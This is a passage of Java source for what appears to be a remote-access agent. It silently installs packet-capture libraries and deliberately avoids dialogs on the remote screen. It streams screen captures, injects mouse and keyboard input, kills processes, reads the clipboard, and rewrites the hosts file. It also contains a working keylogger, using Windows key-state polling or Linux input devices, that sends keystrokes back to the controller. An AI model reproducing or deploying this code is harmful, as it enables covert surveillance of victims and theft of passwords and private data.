            "/opt/local/lib/libpcap.dylib",                 // MacPorts
        };
        for (String p : paths) if (new File(p).exists()) return;

        // ── Step 1: Homebrew (no root required, no GUI) ───────────────────────
        // NEVER call xcode-select --install — it shows a dialog on the remote screen.
        String[] brewPaths = {"/opt/homebrew/bin/brew", "/usr/local/bin/brew"};
        for (String brew : brewPaths) {
            if (!new File(brew).exists()) continue;
            sendStatus("Installing libpcap via Homebrew (silent)…");
            try {
                ProcessBuilder pb = new ProcessBuilder(brew, "install", "libpcap")
                        .redirectErrorStream(true);
                pb.environment().put("HOMEBREW_NO_AUTO_UPDATE",     "1");
                pb.environment().put("HOMEBREW_NO_INSTALL_CLEANUP", "1");
                pb.environment().put("HOMEBREW_NO_ENV_HINTS",       "1");
                Process p = pb.start();
                if (p.waitFor(180, TimeUnit.SECONDS) && p.exitValue() == 0) {
                    for (String path : paths) if (new File(path).exists()) return;
                }
            } catch (Exception ignored) {}
        }

        // ── Step 2: Xcode CLT via softwareupdate (headless/CI trick) ─────────
        // This is the same method Homebrew uses for unattended macOS installs.
        // Requires root or passwordless sudo; produces no GUI or notification.
        sendStatus("Installing Xcode CLT silently via softwareupdate (may take 5-10 min)…");
        File trigger = new File("/tmp/.com.apple.dt.CommandLineTools.installondemand.in-progress");
        try {
            trigger.createNewFile();

            // List available updates to find the CLT package name
            Process listProc = new ProcessBuilder("softwareupdate", "-l")
                    .redirectErrorStream(true).start();
            byte[] listBytes = listProc.getInputStream().readAllBytes(); // reads until process exits
            listProc.waitFor(30, TimeUnit.SECONDS);
            String listOut = new String(listBytes);

            String cltLabel = null;
            for (String line : listOut.split("\n")) {
                // Typical line: "* Label: Command Line Tools for Xcode-15.3"
                if (line.contains("Command Line Tools")) {
                    cltLabel = line.replaceAll("^[^*]*\\*\\s*", "").trim();
                    if (cltLabel.startsWith("Label:")) cltLabel = cltLabel.substring(6).trim();
                    cltLabel = cltLabel.replaceAll("\\s*-\\s*Software Update.*", "").trim();
                }
            }

            if (cltLabel != null && !cltLabel.isEmpty()) {
                // Try without sudo first (some macOS versions allow it), then sudo -n
                for (boolean withSudo : new boolean[]{false, true}) {
                    List<String> cmd = new ArrayList<>();
                    if (withSudo) { cmd.add("sudo"); cmd.add("-n"); }
                    cmd.addAll(Arrays.asList("softwareupdate", "-i", cltLabel, "--agree-to-license"));
                    try {
                        Process install = new ProcessBuilder(cmd).redirectErrorStream(true).start();
                        if (install.waitFor(600, TimeUnit.SECONDS) && install.exitValue() == 0) {
                            for (String path : paths) if (new File(path).exists()) return;
                        }
                    } catch (Exception ignored) {}
                }
            }
        } finally {
            trigger.delete();
        }

        // ── Step 3: MacPorts fallback ─────────────────────────────────────────
        if (new File("/opt/local/bin/port").exists()) {
            try {
                for (boolean withSudo : new boolean[]{true, false}) {
                    List<String> cmd = new ArrayList<>();
                    if (withSudo) { cmd.add("sudo"); cmd.add("-n"); }
                    cmd.addAll(Arrays.asList("/opt/local/bin/port", "install", "libpcap"));
                    Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
                    if (p.waitFor(180, TimeUnit.SECONDS) && p.exitValue() == 0) return;
                }
            } catch (Exception ignored) {}
        }

        throw new RuntimeException(
            "libpcap not installed on this Mac and all silent install methods failed. "
          + "No Homebrew found, and Xcode CLT install requires root on this device.");
    }

    private static boolean commandExists(String cmd) {
        try {
            return new ProcessBuilder("which", cmd)
                    .redirectErrorStream(true).start()
                    .waitFor(5, TimeUnit.SECONDS);
        } catch (Exception e) { return false; }
    }

    // ── Interface selection ───────────────────────────────────────────────────

    private static PcapNetworkInterface selectBestInterface(String os) throws PcapNativeException {
        List<PcapNetworkInterface> devs = Pcaps.findAllDevs();
        if (devs == null || devs.isEmpty()) return null;

        // Linux: prefer the pseudo "any" device — captures on all interfaces at once
        if (os.contains("linux")) {
            for (PcapNetworkInterface d : devs)
                if ("any".equals(d.getName())) return d;
        }

        // Prefer first non-loopback interface that has a real IPv4 address
        for (PcapNetworkInterface d : devs) {
            if (d.isLoopBack()) continue;
            for (PcapAddress a : d.getAddresses()) {
                if (a.getAddress() instanceof java.net.Inet4Address
                        && !a.getAddress().isLoopbackAddress()
                        && !a.getAddress().isLinkLocalAddress()) return d;
            }
        }
        // Fall back to any non-loopback
        for (PcapNetworkInterface d : devs) if (!d.isLoopBack()) return d;
        return devs.get(0);
    }

    // ── Packet extraction (Pcap4J typed packets → JSON) ──────────────────────

    private static JSONObject extractPacket(Packet packet, Timestamp ts) {
        if (packet == null) return null;
        JSONObject p = new JSONObject();

        // Timestamp
        if (ts != null) {
            java.time.LocalDateTime ldt = ts.toLocalDateTime();
            p.put("time", String.format("%02d:%02d:%02d.%06d",
                ldt.getHour(), ldt.getMinute(), ldt.getSecond(), ts.getNanos() / 1000));
        } else { p.put("time", ""); }

        String src = "", dst = "", sp = "", dp = "", proto = "?", info = "";

        // ARP
        ArpPacket arp = packet.get(ArpPacket.class);
        if (arp != null) {
            proto = "ARP";
            src   = safeHost(arp.getHeader().getSrcProtocolAddr());
            dst   = safeHost(arp.getHeader().getDstProtocolAddr());
            info  = arp.getHeader().getOperation().name() + " who-has " + dst + " tell " + src;
            return fill(p, src, sp, dst, dp, proto, packet.length(), info);
        }

        // IPv4
        IpV4Packet ip4 = packet.get(IpV4Packet.class);
        if (ip4 != null) {
            src = safeHost(ip4.getHeader().getSrcAddr());
            dst = safeHost(ip4.getHeader().getDstAddr());

            TcpPacket tcp = packet.get(TcpPacket.class);
            if (tcp != null) {
                sp    = String.valueOf(tcp.getHeader().getSrcPort().valueAsInt());
                dp    = String.valueOf(tcp.getHeader().getDstPort().valueAsInt());
                proto = guessProto(sp, dp, "TCP");
                TcpPacket.TcpHeader h = tcp.getHeader();
                StringBuilder fl = new StringBuilder("[");
                if (h.getSyn()) fl.append("SYN "); if (h.getAck()) fl.append("ACK ");
                if (h.getFin()) fl.append("FIN "); if (h.getRst()) fl.append("RST ");
                if (h.getPsh()) fl.append("PSH ");
                if (fl.length() > 1) fl.deleteCharAt(fl.length() - 1);
                fl.append("]");
                info = "Flags " + fl + " Seq=" + h.getSequenceNumber();
            }
            UdpPacket udp = packet.get(UdpPacket.class);
            if (udp != null) {
                sp    = String.valueOf(udp.getHeader().getSrcPort().valueAsInt());
                dp    = String.valueOf(udp.getHeader().getDstPort().valueAsInt());
                proto = guessProto(sp, dp, "UDP");
                info  = "Len=" + udp.getHeader().getLengthAsInt();
            }
            IcmpV4CommonPacket icmp = packet.get(IcmpV4CommonPacket.class);
            if (icmp != null) { proto = "ICMP"; info = icmp.getHeader().getType().name(); }
            return fill(p, src, sp, dst, dp, proto, packet.length(), info);
        }

        // IPv6
        IpV6Packet ip6 = packet.get(IpV6Packet.class);
        if (ip6 != null) {
            src = safeHost(ip6.getHeader().getSrcAddr());
            dst = safeHost(ip6.getHeader().getDstAddr());
            proto = "IPv6";

            TcpPacket tcp = packet.get(TcpPacket.class);
            if (tcp != null) {
                sp = String.valueOf(tcp.getHeader().getSrcPort().valueAsInt());
                dp = String.valueOf(tcp.getHeader().getDstPort().valueAsInt());
                proto = guessProto(sp, dp, "TCP");
            }
            UdpPacket udp = packet.get(UdpPacket.class);
            if (udp != null) {
                sp = String.valueOf(udp.getHeader().getSrcPort().valueAsInt());
                dp = String.valueOf(udp.getHeader().getDstPort().valueAsInt());
                proto = guessProto(sp, dp, "UDP");
            }
            IcmpV6CommonPacket icmp6 = packet.get(IcmpV6CommonPacket.class);
            if (icmp6 != null) { proto = "ICMPv6"; info = icmp6.getHeader().getType().name(); }
            return fill(p, src, sp, dst, dp, proto, packet.length(), info);
        }

        return null; // skip non-IP (e.g. raw 802.11 management frames)
    }

    private static JSONObject fill(JSONObject p, String src, String sp,
                                   String dst, String dp, String proto, int len, String info) {
        p.put("src", src); p.put("srcPort", sp);
        p.put("dst", dst); p.put("dstPort", dp);
        p.put("protocol", proto); p.put("length", len); p.put("info", info);
        return p;
    }

    private static String safeHost(java.net.InetAddress a) {
        return a == null ? "" : a.getHostAddress();
    }

    private static String guessProto(String sp, String dp, String base) {
        String k = sp + "," + dp;
        if (k.contains("53"))   return "DNS";
        if (k.contains("80"))   return "HTTP";
        if (k.contains("443"))  return "HTTPS";
        if (k.contains("22"))   return "SSH";
        if (k.contains("21") || k.contains("20")) return "FTP";
        if (k.contains("25") || k.contains("587")) return "SMTP";
        if (k.contains("67") || k.contains("68"))  return "DHCP";
        if (k.contains("123")) return "NTP";
        if (k.contains("3389")) return "RDP";
        return base;
    }

    // ── Hosts file ────────────────────────────────────────────────────────────

    private static String hostsFilePath() {
        return System.getProperty("os.name").toLowerCase().contains("win")
                ? "C:\\Windows\\System32\\drivers\\etc\\hosts"
                : "/etc/hosts";
    }

    private static void handleHostsRead(JSONObject msg) {
        JSONObject result = new JSONObject();
        result.put("cmd", "net:hosts_data");
        try {
            List<String> lines = Files.readAllLines(Paths.get(hostsFilePath()));
            JSONArray header  = new JSONArray();
            JSONArray entries = new JSONArray();
            for (String raw : lines) {
                String line = raw.trim();
                if (line.isEmpty() || line.startsWith("#")) {
                    header.put(raw);
                    continue;
                }
                // strip inline comment
                String comment = "";
                int hash = line.indexOf('#');
                if (hash > 0) { comment = line.substring(hash).trim(); line = line.substring(0, hash).trim(); }
                String[] parts = line.split("\\s+");
                if (parts.length < 2) continue;
                String ip = parts[0];
                for (int i = 1; i < parts.length; i++) {
                    JSONObject e = new JSONObject();
                    e.put("ip", ip);
                    e.put("host", parts[i]);
                    e.put("comment", i == 1 ? comment : "");
                    entries.put(e);
                }
            }
            result.put("headerComments", header);
            result.put("entries", entries);
        } catch (Exception e) {
            result.put("headerComments", new JSONArray());
            result.put("entries", new JSONArray());
        }
        send(result);
    }

    private static void handleHostsWrite(JSONObject msg) {
        JSONObject result = new JSONObject();
        result.put("cmd", "net:hosts_result");
        try {
            JSONArray hdr     = msg.optJSONArray("headerComments");
            JSONArray entries = msg.optJSONArray("entries");

            StringBuilder sb = new StringBuilder();
            if (hdr != null) {
                for (int i = 0; i < hdr.length(); i++)
                    sb.append(hdr.getString(i)).append(System.lineSeparator());
            }
            if (entries != null) {
                for (int i = 0; i < entries.length(); i++) {
                    JSONObject e = entries.getJSONObject(i);
                    String ip      = e.optString("ip", "").trim();
                    String host    = e.optString("host", "").trim();
                    String comment = e.optString("comment", "").trim();
                    if (ip.isEmpty() || host.isEmpty()) continue;
                    String line = ip + "\t" + host;
                    if (!comment.isEmpty()) line += "\t" + comment;
                    sb.append(line).append(System.lineSeparator());
                }
            }
            Files.write(Paths.get(hostsFilePath()),
                    sb.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8));
            result.put("success", true);
        } catch (Exception e) {
            result.put("success", false);
            result.put("error",   e.getMessage());
        }
        send(result);
    }

    // ── Network interfaces ────────────────────────────────────────────────────

    private static void handleInterfacesList(JSONObject msg) {
        JSONObject result = new JSONObject();
        result.put("cmd", "net:interfaces_data");
        JSONArray list = new JSONArray();
        try {
            Enumeration<java.net.NetworkInterface> ifaces =
                    java.net.NetworkInterface.getNetworkInterfaces();
            if (ifaces != null) {
                for (java.net.NetworkInterface iface : Collections.list(ifaces)) {
                    JSONObject entry = new JSONObject();
                    entry.put("name", iface.getDisplayName());
                    entry.put("mtu",  iface.getMTU());
                    entry.put("up",   iface.isUp());

                    // MAC address
                    byte[] mac = iface.getHardwareAddress();
                    if (mac != null) {
                        StringBuilder sb = new StringBuilder();
                        for (byte b : mac) sb.append(String.format("%02X:", b));
                        if (sb.length() > 0) sb.deleteCharAt(sb.length() - 1);
                        entry.put("mac", sb.toString());
                    } else { entry.put("mac", ""); }

                    // IP addresses
                    String ip4 = "", ip6 = "";
                    for (java.net.InterfaceAddress ia : iface.getInterfaceAddresses()) {
                        String addr = ia.getAddress().getHostAddress();
                        if (addr.contains(":")) { if (ip6.isEmpty()) ip6 = addr; }
                        else                    { if (ip4.isEmpty()) ip4 = addr; }
                    }
                    entry.put("ip4", ip4); entry.put("ip6", ip6);
                    list.put(entry);
                }
            }
        } catch (Exception e) { /* partial list is ok */ }
        result.put("interfaces", list);
        send(result);
    }

    // === SCREEN CAPTURE ===

    private static void handleScreenStart(JSONObject msg) {
        String sessionId = msg.getString("sessionId");
        int quality = msg.optInt("quality", 60);
        int fps     = msg.optInt("fps", 10);

        Robot r = getRobot();
        if (r == null) {
            JSONObject err = new JSONObject();
            err.put("cmd", "screen:error");
            err.put("sessionId", sessionId);
            err.put("error", "Screen capture unavailable (headless or unsupported OS)");
            send(err);
            return;
        }

        Thread captureThread = new Thread(() -> {
            try {
                Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
                long frameDelay = 1000L / Math.max(1, fps);

                JSONObject started = new JSONObject();
                started.put("cmd", "screen:started");
                started.put("sessionId", sessionId);
                started.put("width",  screenRect.width);
                started.put("height", screenRect.height);
                send(started);

                while (screenSessions.containsKey(sessionId)
                        && !Thread.currentThread().isInterrupted()) {
                    long t0 = System.currentTimeMillis();

                    BufferedImage capture = r.createScreenCapture(screenRect);
                    byte[] jpeg  = encodeJpeg(capture, quality / 100f);
                    String b64   = Base64.getEncoder().encodeToString(jpeg);

                    JSONObject frame = new JSONObject();
                    frame.put("cmd",       "screen:frame");
                    frame.put("sessionId", sessionId);
                    frame.put("width",     screenRect.width);
                    frame.put("height",    screenRect.height);
                    frame.put("data",      b64);
                    send(frame);

                    long sleep = frameDelay - (System.currentTimeMillis() - t0);
                    if (sleep > 0) Thread.sleep(sleep);
                }
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            } catch (Exception e) {
                JSONObject err = new JSONObject();
                err.put("cmd",       "screen:error");
                err.put("sessionId", sessionId);
                err.put("error",     e.getMessage());
                send(err);
            } finally {
                screenSessions.remove(sessionId);
            }
        }, "screen-" + sessionId);

        captureThread.setDaemon(true);
        screenSessions.put(sessionId, captureThread);
        captureThread.start();
    }

    private static void handleScreenStop(JSONObject msg) {
        String sessionId = msg.getString("sessionId");
        Thread t = screenSessions.remove(sessionId);
        if (t != null) t.interrupt();
    }

    /** Encode a BufferedImage as JPEG bytes at the given quality (0.0–1.0). */
    private static byte[] encodeJpeg(BufferedImage img, float quality) throws IOException {
        // Convert to TYPE_INT_RGB — JPEG encoder rejects images with alpha channel
        BufferedImage rgb = new BufferedImage(img.getWidth(), img.getHeight(),
                                              BufferedImage.TYPE_INT_RGB);
        rgb.createGraphics().drawImage(img, 0, 0, null);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ImageWriter writer = ImageIO.getImageWritersByFormatName("jpeg").next();
        ImageWriteParam param = writer.getDefaultWriteParam();
        param.setCompressionMode(ImageWriteParam.MODE_EXPLICIT);
        param.setCompressionQuality(Math.max(0.1f, Math.min(1f, quality)));
        writer.setOutput(new MemoryCacheImageOutputStream(baos));
        writer.write(null, new IIOImage(rgb, null, null), param);
        writer.dispose();
        return baos.toByteArray();
    }

    // === ROBOT INPUT ===

    private static void handleMouseMove(JSONObject msg) {
        Robot r = getRobot();
        if (r != null) r.mouseMove(msg.getInt("x"), msg.getInt("y"));
    }

    private static void handleMousePress(JSONObject msg) {
        Robot r = getRobot();
        if (r == null) return;
        r.mouseMove(msg.getInt("x"), msg.getInt("y"));
        r.mousePress(msg.getInt("button"));
    }

    private static void handleMouseRelease(JSONObject msg) {
        Robot r = getRobot();
        if (r != null) r.mouseRelease(msg.getInt("button"));
    }

    private static void handleMouseScroll(JSONObject msg) {
        Robot r = getRobot();
        if (r != null) r.mouseWheel(msg.getInt("amount"));
    }

    private static void handleKeyPress(JSONObject msg) {
        Robot r = getRobot();
        if (r == null) return;
        try { r.keyPress(msg.getInt("keyCode")); }
        catch (IllegalArgumentException ignored) {}
    }

    private static void handleKeyRelease(JSONObject msg) {
        Robot r = getRobot();
        if (r == null) return;
        try { r.keyRelease(msg.getInt("keyCode")); }
        catch (IllegalArgumentException ignored) {}
    }

    // === OTHERS: SYSTEM INFO ===

    private static void handleSysInfo(JSONObject msg) {
        JSONObject result = new JSONObject();
        result.put("cmd", "sys:info_data");
        JSONArray rows = new JSONArray();
        try {
            addRow(rows, "OS Name",       System.getProperty("os.name"));
            addRow(rows, "OS Version",    System.getProperty("os.version"));
            addRow(rows, "Architecture",  System.getProperty("os.arch"));
            addRow(rows, "Username",      System.getProperty("user.name"));
            addRow(rows, "Home Dir",      System.getProperty("user.home"));
            addRow(rows, "Java Version",  System.getProperty("java.version"));
            addRow(rows, "CPU Cores",     String.valueOf(Runtime.getRuntime().availableProcessors()));

            java.lang.management.OperatingSystemMXBean osb =
                java.lang.management.ManagementFactory.getOperatingSystemMXBean();
            if (osb instanceof com.sun.management.OperatingSystemMXBean) {
                com.sun.management.OperatingSystemMXBean sb = (com.sun.management.OperatingSystemMXBean) osb;
                long tot = sb.getTotalPhysicalMemorySize();
                long free = sb.getFreePhysicalMemorySize();
                addRow(rows, "Total RAM", humanBytes(tot));
                addRow(rows, "Free RAM",  humanBytes(free));
                addRow(rows, "Used RAM",  humanBytes(tot - free));
            }

            long upMs = java.lang.management.ManagementFactory.getRuntimeMXBean().getUptime();
            addRow(rows, "JVM Uptime", formatDuration(upMs));

            for (java.io.File root : java.io.File.listRoots()) {
                long tot = root.getTotalSpace();
                if (tot == 0) continue;
                addRow(rows, "Disk " + root.getPath(),
                    humanBytes(tot - root.getFreeSpace()) + " used / " + humanBytes(tot));
            }

            try { addRow(rows, "Hostname", java.net.InetAddress.getLocalHost().getHostName()); }
            catch (Exception ignored) {}

            java.util.Enumeration<java.net.NetworkInterface> ifaces =
                java.net.NetworkInterface.getNetworkInterfaces();
            if (ifaces != null) {
                for (java.net.NetworkInterface iface : java.util.Collections.list(ifaces)) {
                    if (iface.isLoopback() || !iface.isUp()) continue;
                    for (java.net.InterfaceAddress ia : iface.getInterfaceAddresses()) {
                        if (ia.getAddress() instanceof java.net.Inet4Address)
                            addRow(rows, "IP (" + iface.getDisplayName() + ")",
                                ia.getAddress().getHostAddress());
                    }
                    byte[] mac = iface.getHardwareAddress();
                    if (mac != null) {
                        StringBuilder sb = new StringBuilder();
                        for (byte b : mac) sb.append(String.format("%02X:", b));
                        if (sb.length() > 0) sb.deleteCharAt(sb.length() - 1);
                        addRow(rows, "MAC (" + iface.getDisplayName() + ")", sb.toString());
                    }
                }
            }
        } catch (Exception e) { addRow(rows, "Error", e.getMessage()); }
        result.put("rows", rows);
        send(result);
    }

    private static void addRow(JSONArray arr, String key, String value) {
        JSONObject r = new JSONObject();
        r.put("key", key); r.put("value", value != null ? value : "N/A");
        arr.put(r);
    }
    private static String humanBytes(long b) {
        if (b < 1024) return b + " B";
        int e = (int)(Math.log(b) / Math.log(1024));
        return String.format("%.2f %sB", b / Math.pow(1024, e), "KMGTPE".charAt(e-1));
    }
    private static String formatDuration(long ms) {
        long s = ms/1000, m = s/60; s%=60; long h = m/60; m%=60; long d = h/24; h%=24;
        if (d>0) return d+"d "+h+"h "+m+"m";
        if (h>0) return h+"h "+m+"m "+s+"s";
        return m+"m "+s+"s";
    }

    // === OTHERS: PROCESS MANAGER ===

    private static void handleProcList(JSONObject msg) {
        JSONObject result = new JSONObject();
        result.put("cmd", "proc:list_data");
        JSONArray procs = new JSONArray();
        try {
            String os = System.getProperty("os.name").toLowerCase();
            Process p;
            if (os.contains("win")) {
                p = new ProcessBuilder("tasklist", "/FO", "CSV", "/NH")
                    .redirectErrorStream(true).start();
            } else {
                p = new ProcessBuilder("ps", "-eo", "pid,comm,rss")
                    .redirectErrorStream(true).start();
            }
            try (java.io.BufferedReader r = new java.io.BufferedReader(
                    new java.io.InputStreamReader(p.getInputStream()))) {
                boolean skipHeader = !os.contains("win");
                String line;
                while ((line = r.readLine()) != null) {
                    if (skipHeader) { skipHeader = false; continue; }
                    if (os.contains("win")) {
                        String[] pts = line.replaceAll("\"","").split(",");
                        if (pts.length >= 5) {
                            JSONObject pr = new JSONObject();
                            pr.put("name", pts[0].trim());
                            pr.put("pid",  pts[1].trim());
                            pr.put("mem",  pts[4].trim());
                            procs.put(pr);
                        }
                    } else {
                        String[] pts = line.trim().split("\\s+", 3);
                        if (pts.length >= 2) {
                            JSONObject pr = new JSONObject();
                            pr.put("pid",  pts[0]);
                            pr.put("name", pts[1]);
                            pr.put("mem",  pts.length > 2 ? pts[2].trim()+" KB" : "?");
                            procs.put(pr);
                        }
                    }
                }
            }
        } catch (Exception e) { result.put("error", e.getMessage()); }
        result.put("processes", procs);
        send(result);
    }

    private static void handleProcKill(JSONObject msg) {
        String pid = msg.optString("pid", "");
        JSONObject result = new JSONObject();
        result.put("cmd", "proc:kill_result");
        result.put("pid", pid);
        try {
            String os = System.getProperty("os.name").toLowerCase();
            Process p = (os.contains("win")
                ? new ProcessBuilder("taskkill", "/F", "/PID", pid)
                : new ProcessBuilder("kill", "-9", pid))
                .redirectErrorStream(true).start();
            boolean done = p.waitFor(10, TimeUnit.SECONDS);
            result.put("success", done && p.exitValue() == 0);
            if (!done || p.exitValue() != 0)
                result.put("error", new String(p.getInputStream().readAllBytes()).trim());
        } catch (Exception e) {
            result.put("success", false); result.put("error", e.getMessage());
        }
        send(result);
    }

    // === OTHERS: CLIPBOARD ===

    private static void handleClipGet(JSONObject msg) {
        JSONObject result = new JSONObject();
        result.put("cmd", "clip:data");
        try {
            java.awt.datatransfer.Clipboard clip =
                java.awt.Toolkit.getDefaultToolkit().getSystemClipboard();
            java.awt.datatransfer.Transferable t = clip.getContents(null);
            if (t != null && t.isDataFlavorSupported(java.awt.datatransfer.DataFlavor.stringFlavor))
                result.put("text", (String) t.getTransferData(java.awt.datatransfer.DataFlavor.stringFlavor));
            else result.put("text", "");
        } catch (Exception e) { result.put("text", ""); result.put("error", e.getMessage()); }
        send(result);
    }

    private static void handleClipSet(JSONObject msg) {
        JSONObject result = new JSONObject();
        result.put("cmd", "clip:set_result");
        try {
            java.awt.datatransfer.StringSelection sel =
                new java.awt.datatransfer.StringSelection(msg.optString("text", ""));
            java.awt.Toolkit.getDefaultToolkit().getSystemClipboard().setContents(sel, sel);
            result.put("success", true);
        } catch (Exception e) { result.put("success", false); result.put("error", e.getMessage()); }
        send(result);
    }

    // === OTHERS: KEYLOGGER ===

    // Minimal JNA interface — uses jna-core only, no jna-platform needed
    private interface WinUser32 extends com.sun.jna.Library {
        short GetAsyncKeyState(int vKey);
        short GetKeyState(int vKey);
    }
    private static volatile WinUser32 winUser32;
    private static WinUser32 getUser32() {
        if (winUser32 == null) {
            try { winUser32 = com.sun.jna.Native.load("user32", WinUser32.class); }
            catch (Exception ignored) {}
        }
        return winUser32;
    }

    private static final Map<String, Thread> keylogSessions = new ConcurrentHashMap<>();

    // Linux: key code → display string (kernel keycodes, 64-bit little-endian input_event)
    private static final String[] LINUX_KEY = new String[256];
    static {
        LINUX_KEY[1]="[ESC]"; LINUX_KEY[2]="1"; LINUX_KEY[3]="2"; LINUX_KEY[4]="3";
        LINUX_KEY[5]="4"; LINUX_KEY[6]="5"; LINUX_KEY[7]="6"; LINUX_KEY[8]="7";
        LINUX_KEY[9]="8"; LINUX_KEY[10]="9"; LINUX_KEY[11]="0"; LINUX_KEY[12]="-";
        LINUX_KEY[13]="="; LINUX_KEY[14]="[BKSP]"; LINUX_KEY[15]="[TAB]";
        LINUX_KEY[16]="q"; LINUX_KEY[17]="w"; LINUX_KEY[18]="e"; LINUX_KEY[19]="r";
        LINUX_KEY[20]="t"; LINUX_KEY[21]="y"; LINUX_KEY[22]="u"; LINUX_KEY[23]="i";
        LINUX_KEY[24]="o"; LINUX_KEY[25]="p"; LINUX_KEY[26]="["; LINUX_KEY[27]="]";
        LINUX_KEY[28]="[ENTER]\n"; LINUX_KEY[30]="a"; LINUX_KEY[31]="s";
        LINUX_KEY[32]="d"; LINUX_KEY[33]="f"; LINUX_KEY[34]="g"; LINUX_KEY[35]="h";
        LINUX_KEY[36]="j"; LINUX_KEY[37]="k"; LINUX_KEY[38]="l"; LINUX_KEY[39]=";";
        LINUX_KEY[40]="'"; LINUX_KEY[41]="`"; LINUX_KEY[44]="z"; LINUX_KEY[45]="x";
        LINUX_KEY[46]="c"; LINUX_KEY[47]="v"; LINUX_KEY[48]="b"; LINUX_KEY[49]="n";
        LINUX_KEY[50]="m"; LINUX_KEY[51]=","; LINUX_KEY[52]="."; LINUX_KEY[53]="/";
        LINUX_KEY[57]=" ";
        for (int i=0;i<12;i++) LINUX_KEY[59+i]="[F"+(i+1)+"]";
    }

    private static void handleKeyStart(JSONObject msg) {
        String sid = msg.getString("sessionId");
        if (keylogSessions.containsKey(sid)) return;
        String os = System.getProperty("os.name").toLowerCase();
        Thread t;
        if (os.contains("win"))    t = new Thread(() -> keylogWindows(sid), "klog-"+sid);
        else if (os.contains("linux")) t = new Thread(() -> keylogLinux(sid),   "klog-"+sid);
        else {
            sendOthersError("key:start", "Keylogger not supported on " + os);
            return;
        }
        keylogSessions.put(sid, t);
        t.setDaemon(true);
        t.start();
        JSONObject ack = new JSONObject();
        ack.put("cmd", "key:started"); ack.put("sessionId", sid);
        send(ack);
    }

    private static void handleKeyStop(JSONObject msg) {
        String sid = msg.getString("sessionId");
        Thread t = keylogSessions.remove(sid);
        if (t != null) t.interrupt();
    }

    private static void keylogWindows(String sid) {
        WinUser32 u32 = getUser32();
        if (u32 == null) {
            sendOthersError("keylog", "user32.dll not available");
            keylogSessions.remove(sid);
            return;
        }
        boolean[] prev = new boolean[256];
        StringBuilder buf = new StringBuilder();
        long lastFlush = System.currentTimeMillis();
        try {
            while (keylogSessions.containsKey(sid) && !Thread.currentThread().isInterrupted()) {
                boolean shift = (u32.GetAsyncKeyState(0x10) & 0x8000) != 0;
                boolean caps  = (u32.GetKeyState(0x14) & 0x0001) != 0;
                for (int vk = 0; vk < 256; vk++) {
                    boolean down = (u32.GetAsyncKeyState(vk) & 0x8000) != 0;
                    if (down && !prev[vk]) {
                        String ch = vkToChar(vk, shift, caps);
                        if (ch != null) buf.append(ch);
                    }
                    prev[vk] = down;
                }
                long now = System.currentTimeMillis();
                if (buf.length() > 0 && (now - lastFlush > 500 || buf.length() > 80)) {
                    JSONObject d = new JSONObject();
                    d.put("cmd","key:data"); d.put("sessionId",sid); d.put("data",buf.toString());
                    send(d); buf.setLength(0); lastFlush = now;
                }
                Thread.sleep(10);
            }
        } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
        catch (Exception e) { sendOthersError("keylog", e.getMessage()); }
        finally {
            keylogSessions.remove(sid);
            JSONObject done = new JSONObject();
            done.put("cmd","key:stopped"); done.put("sessionId",sid); send(done);
        }
    }

    private static void keylogLinux(String sid) {
        // Find keyboard device via /proc/bus/input/devices
        java.io.File kbd = null;
        try {
            for (String line : Files.readAllLines(Paths.get("/proc/bus/input/devices"))) {
                if (line.startsWith("H: Handlers=") && line.contains("kbd")) {
                    for (String h : line.substring(12).split(" ")) {
                        if (h.startsWith("event")) {
                            java.io.File f = new java.io.File("/dev/input/"+h.trim());
                            if (f.canRead()) { kbd = f; break; }
                        }
                    }
                }
                if (kbd != null) break;
            }
        } catch (Exception ignored) {}
        if (kbd == null) {
            java.io.File[] evts = new java.io.File("/dev/input").listFiles(
                (d,n) -> n.startsWith("event"));
            if (evts != null) for (java.io.File f : evts) { if (f.canRead()) { kbd = f; break; } }
        }
        if (kbd == null || !kbd.canRead()) {
            sendOthersError("keylog", "Cannot read /dev/input/event* — run as root");
            keylogSessions.remove(sid);
            JSONObject done = new JSONObject();
            done.put("cmd","key:stopped"); done.put("sessionId",sid); send(done);
            return;
        }
        // Linux input_event (64-bit): 24 bytes — 8 tv_sec + 8 tv_usec + 2 type + 2 code + 4 value
        StringBuilder buf = new StringBuilder();
        long lastFlush = System.currentTimeMillis();
        try (java.io.FileInputStream fis = new java.io.FileInputStream(kbd)) {
            byte[] ev = new byte[24];
            while (keylogSessions.containsKey(sid) && !Thread.currentThread().isInterrupted()) {
                int read = fis.read(ev, 0, 24);
                if (read < 24) continue;
                short type  = (short)((ev[17]&0xFF)<<8|(ev[16]&0xFF));
                short code  = (short)((ev[19]&0xFF)<<8|(ev[18]&0xFF));
                int   value = (ev[23]&0xFF)<<24|(ev[22]&0xFF)<<16|(ev[21]&0xFF)<<8|(ev[20]&0xFF);
                if (type == 1 && (value == 1 || value == 2) && code < LINUX_KEY.length) {
                    String ch = LINUX_KEY[code];
                    if (ch != null) buf.append(ch);
                }
                long now = System.currentTimeMillis();
                if (buf.length() > 0 && (now - lastFlush > 500 || buf.length() > 80)) {
                    JSONObject d = new JSONObject();
                    d.put("cmd","key:data"); d.put("sessionId",sid); d.put("data",buf.toString());
                    send(d); buf.setLength(0); lastFlush = now;
                }
            }
        } catch (Exception e) { sendOthersError("keylog", e.getMessage()); }
        finally {
            keylogSessions.remove(sid);
            JSONObject done = new JSONObject();
            done.put("cmd","key:stopped"); done.put("sessionId",sid); send(done);
        }
    }

    private static String vkToChar(int vk, boolean shift, boolean caps) {
        switch (vk) {
            case 0x08: return "[BKSP]"; case 0x09: return "[TAB]";
            case 0x0D: return "[ENTER]\n"; case 0x1B: return "[ESC]";
            case 0x20: return " "; case 0x2E: return "[DEL]";
            case 0x25: return "[←]"; case 0x26: return "[↑]";
            case 0x27: return "[→]"; case 0x28: return "[↓]";
            case 0x10: case 0x11: case 0x12:
            case 0xA0: case 0xA1: case 0xA2: case 0xA3:
            case 0x5B: case 0x5C: return null;
        }
        if (vk>=0x30&&vk<=0x39) {
            if (shift) return String.valueOf("!@#$%^&*()".charAt(vk - 0x30));
            return ""+(char)vk;
        }
        if (vk>=0x41&&vk<=0x5A) return ""+(char)(shift^caps ? vk : vk+32);
        if (vk>=0x60&&vk<=0x69) return ""+(vk-0x60);
        if (vk>=0x70&&vk<=0x7B) return "[F"+(vk-0x6F)+"]";
